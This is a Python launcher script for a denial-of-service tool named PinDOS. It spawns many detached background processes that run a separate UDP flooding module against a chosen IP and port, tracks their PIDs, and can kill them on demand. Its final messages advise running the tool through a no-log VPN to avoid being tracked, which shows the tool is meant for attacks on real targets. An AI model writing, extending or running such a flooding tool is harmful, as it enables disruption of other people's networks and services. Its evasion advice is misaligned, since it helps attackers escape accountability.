#!/bin/env python3
# PinDOS starter script

import argparse
import os
import signal
import subprocess
import sys

PID_FILE = "spawned_pids.txt"

def load_tracked_pids():
    if not os.path.exists(PID_FILE):
        return []
    with open(PID_FILE, "r") as f:
        return [line.strip() for line in f if line.strip()]

def save_tracked_pids(pids):
    with open(PID_FILE, "w") as f:
        for pid in pids:
            f.write(f"{pid}\n")

def append_tracked_pids(pids):
    with open(PID_FILE, "a") as f:
        for pid in pids:
            f.write(f"{pid}\n")

# Custom validation is required because standard argparse cannot easily handle
# a mix of standard choices ("all") and arbitrary numeric strings (PIDs).
parser = argparse.ArgumentParser(
    description="Launch or terminate DOS background processes."
)
parser.add_argument("--server-ip", help="Destination IP address")
parser.add_argument("--server-port", type=int, help="Destination UDP port")
parser.add_argument("--message", default="Hello", help="Message to send")
parser.add_argument("--count", type=int, default=1, help="Number of packets per process")
parser.add_argument("--processes", type=int, default=1, help="Number of DOS background processes to spawn")
parser.add_argument("--kill", nargs="?", const="all", help="Kill 'all' tracked processes, or specify a specific PID to kill one")

args, unknown = parser.parse_known_args()

if unknown and args.kill is None:
    if len(unknown) == 1 and unknown[0].isdigit():
        args.kill = unknown[0]
    else:
        parser.error(f"Unrecognized arguments: {unknown}")
elif unknown:
    parser.error(f"Unrecognized arguments: {unknown}")

if args.kill:
    if args.server_ip or args.server_port:
        parser.error("Cannot mix process launching arguments (--server-ip/--server-port) with --kill.")
else:
    if not args.server_ip or not args.server_port:
        parser.error("the following arguments are required: --server-ip, --server-port")


if args.kill:
    tracked_pids = load_tracked_pids()

    if not tracked_pids:
        print("No active processes tracked in history.")
        sys.exit(0)

    # Determine targets based on input
    if args.kill == "all":
        pids_to_kill = tracked_pids.copy()
    else:
        if args.kill not in tracked_pids:
            print(f"Warning: PID {args.kill} is not in the tracked process list. Attempting kill anyway...")
        pids_to_kill = [args.kill]

    remaining_pids = tracked_pids.copy()

    for pid_str in pids_to_kill:
        try:
            pid = int(pid_str)
            if sys.platform == "win32":
                subprocess.run(["taskkill", "/F", "/PID", str(pid)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                os.kill(pid, signal.SIGTERM)
            print(f"Successfully killed process {pid}")
        except ProcessLookupError:
            print(f"Process {pid_str} was already dead.")
        except ValueError:
            print(f"Invalid PID format: {pid_str}")
        except Exception as e:
            print(f"Failed to kill {pid_str}: {e}")
        finally:
            if pid_str in remaining_pids:
                remaining_pids.remove(pid_str)

    save_tracked_pids(remaining_pids)
    sys.exit(0)

else:
    cmd = [
        "python3",
        "core/dos.py",
        "--server-ip", str(args.server_ip),
        "--server-port", str(args.server_port),
        "--message", str(args.message),
        "--count", str(args.count),
    ]

    spawned_pids = []
    
    for _ in range(args.processes):
        proc = subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        spawned_pids.append(str(proc.pid))

    append_tracked_pids(spawned_pids)
    print(f"Launched {args.processes} DOS background process(es).")
    print(f"Keep in mind that the DOS effectiveness is limited by network speed.")
    print(f"It's recommended to run this with a VPN to avoid getting tracked.")
    print(f"If you are going to use a VPN, use a nolog VPN.")